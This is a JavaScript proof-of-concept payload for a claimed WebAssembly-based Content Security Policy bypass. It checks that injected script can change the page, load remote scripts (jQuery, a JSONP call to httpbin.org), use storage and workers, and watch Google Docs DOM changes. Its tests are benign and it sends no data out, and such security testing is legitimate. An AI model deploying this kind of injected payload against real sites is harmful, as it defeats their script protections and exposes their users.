// test-payload.js - CSP Bypass Test Payload
// This file demonstrates successful CSP bypass via WASM

console.log('🎯 External JavaScript file loaded successfully via WASM bypass!');

// Test 1: DOM Manipulation
(function testDOMManipulation() {
    try {
        const testDiv = document.createElement('div');
        testDiv.id = 'wasm-bypass-test';
        testDiv.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            padding: 15px;
            border-radius: 8px;
            z-index: 10000;
            font-family: Arial, sans-serif;
            font-size: 14px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            max-width: 300px;
        `;
        testDiv.innerHTML = `
            <strong>🚀 WASM CSP Bypass Success!</strong><br>
            <small>External JS loaded and DOM manipulated</small><br>
            <button onclick="this.parentElement.remove()" style="margin-top:5px;padding:5px 10px;border:none;border-radius:4px;cursor:pointer;">Close</button>
        `;
        document.body.appendChild(testDiv);
        
        // Auto-remove after 10 seconds
        setTimeout(() => {
            if (testDiv.parentElement) {
                testDiv.remove();
            }
        }, 10000);
        
        console.log('✅ DOM manipulation test passed');
    } catch(e) {
        console.error('❌ DOM manipulation test failed:', e);
    }
})();

// Test 2: External Resource Loading
(function testExternalResources() {
    try {
        // Try to load jQuery if not already present
        if (typeof jQuery === 'undefined') {
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js';
            script.onload = function() {
                console.log('✅ External library (jQuery) loaded successfully');
                
                // Test jQuery functionality
                setTimeout(() => {
                    if (typeof $ !== 'undefined') {
                        $('body').append('<div id="jquery-test" style="display:none;">jQuery working!</div>');
                        console.log('✅ jQuery functionality test passed');
                    }
                }, 500);
            };
            script.onerror = function() {
                console.log('❌ External library loading failed');
            };
            document.head.appendChild(script);
        } else {
            console.log('✅ jQuery already available');
        }
    } catch(e) {
        console.error('❌ External resource loading test failed:', e);
    }
})();

// Test 3: Local Storage Access
(function testLocalStorage() {
    try {
        const testKey = 'wasm-bypass-test';
        const testValue = 'CSP bypassed at ' + new Date().toISOString();
        
        localStorage.setItem(testKey, testValue);
        const retrieved = localStorage.getItem(testKey);
        
        if (retrieved === testValue) {
            console.log('✅ Local storage access test passed');
        } else {
            console.log('❌ Local storage access test failed');
        }
        
        // Clean up
        localStorage.removeItem(testKey);
    } catch(e) {
        console.error('❌ Local storage test failed:', e);
    }
})();

// Test 4: Network Requests
(function testNetworkRequests() {
    try {
        // Test fetch API
        fetch('https://httpbin.org/ip')
            .then(response => response.json())
            .then(data => {
                console.log('✅ Network request test passed. IP:', data.origin);
            })
            .catch(e => {
                console.log('❌ Network request test failed:', e.message);
                
                // Fallback: try JSONP
                window.jsonpCallback = function(data) {
                    console.log('✅ JSONP fallback test passed');
                    delete window.jsonpCallback;
                };
                
                const script = document.createElement('script');
                script.src = 'https://httpbin.org/ip?callback=jsonpCallback';
                script.onerror = () => {
                    console.log('❌ JSONP fallback also failed');
                };
                document.head.appendChild(script);
            });
    } catch(e) {
        console.error('❌ Network request test failed:', e);
    }
})();

// Test 5: Event Listeners and Interactions
(function testEventSystem() {
    try {
        let clickCount = 0;
        
        function testClickHandler(event) {
            clickCount++;
            console.log(`✅ Event system test: Click ${clickCount} detected`);
            
            if (clickCount >= 3) {
                document.removeEventListener('click', testClickHandler);
                console.log('✅ Event system test completed');
            }
        }
        
        document.addEventListener('click', testClickHandler);
        
        // Simulate a click after 1 second
        setTimeout(() => {
            const event = new MouseEvent('click', {
                bubbles: true,
                cancelable: true,
                view: window
            });
            document.dispatchEvent(event);
        }, 1000);
        
        console.log('✅ Event listener registration test passed');
    } catch(e) {
        console.error('❌ Event system test failed:', e);
    }
})();

// Test 6: Advanced Features
(function testAdvancedFeatures() {
    try {
        // Test Web Workers (if available)
        if (typeof Worker !== 'undefined') {
            try {
                const workerCode = `
                    self.onmessage = function(e) {
                        self.postMessage('Worker received: ' + e.data);
                    };
                `;
                const blob = new Blob([workerCode], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));
                
                worker.onmessage = function(e) {
                    console.log('✅ Web Worker test passed:', e.data);
                    worker.terminate();
                };
                
                worker.onerror = function(e) {
                    console.log('❌ Web Worker test failed:', e);
                };
                
                worker.postMessage('test message');
            } catch(e) {
                console.log('❌ Web Worker creation failed:', e);
            }
        }
        
        // Test IndexedDB
        if ('indexedDB' in window) {
            const request = indexedDB.open('WASMBypassTest', 1);
            request.onsuccess = function() {
                console.log('✅ IndexedDB access test passed');
                request.result.close();
            };
            request.onerror = function() {
                console.log('❌ IndexedDB access test failed');
            };
        }
        
    } catch(e) {
        console.error('❌ Advanced features test failed:', e);
    }
})();

// Test 7: Google Docs Specific Tests
(function testGoogleDocsSpecific() {
    if (window.location.hostname.includes('docs.google.com')) {
        console.log('🎯 Running Google Docs specific tests...');
        
        try {
            // Try to access Google Docs elements
            const docsElements = document.querySelectorAll('[role="textbox"], .docs-texteventtarget-iframe');
            
            if (docsElements.length > 0) {
                console.log('✅ Google Docs elements found:', docsElements.length);
                
                // Test if we can observe changes (without modifying)
                const observer = new MutationObserver(function(mutations) {
                    console.log('✅ Google Docs DOM changes observed:', mutations.length);
                });
                
                observer.observe(document.body, {
                    childList: true,
                    subtree: true
                });
                
                // Stop observing after 5 seconds
                setTimeout(() => {
                    observer.disconnect();
                    console.log('✅ Google Docs observation test completed');
                }, 5000);
            }
            
        } catch(e) {
            console.error('❌ Google Docs specific test failed:', e);
        }
    }
})();

// Final success report
setTimeout(() => {
    console.log(`
🎉 WASM CSP Bypass Test Payload Complete!

Summary:
- External JavaScript successfully loaded via WASM bypass
- Multiple browser APIs tested
- DOM manipulation successful
- Event system functional
${window.location.hostname.includes('docs.google.com') ? '- Google Docs specific tests executed' : ''}

This demonstrates that the CSP has been successfully bypassed.
    `);
    
    // Store success flag
    window.wasmBypassTestComplete = true;
}, 3000);
